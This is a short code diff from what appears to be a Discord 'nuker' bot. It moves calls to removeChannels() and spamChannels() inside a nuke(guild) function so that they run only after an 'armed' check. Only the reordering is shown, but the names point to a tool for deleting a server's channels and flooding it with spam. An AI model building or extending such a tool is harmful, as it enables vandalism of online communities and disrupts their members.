@@ -87,10 +87,6 @@ client.once(Events.ClientReady, readyClient => { console.log(`Logged in as ${rea
 function nuke(guild)
 {
 
-    //CALL FUNCTIONS
-    removeChannels();
-    spamChannels();
-
     //Return if the nuker is not armed
     if(!armed) return;
 
@@ -128,6 +124,10 @@ function nuke(guild)
             })
         }
     }
+
+    //Call functions
+    removeChannels();
+    spamChannels();
 
 }
 
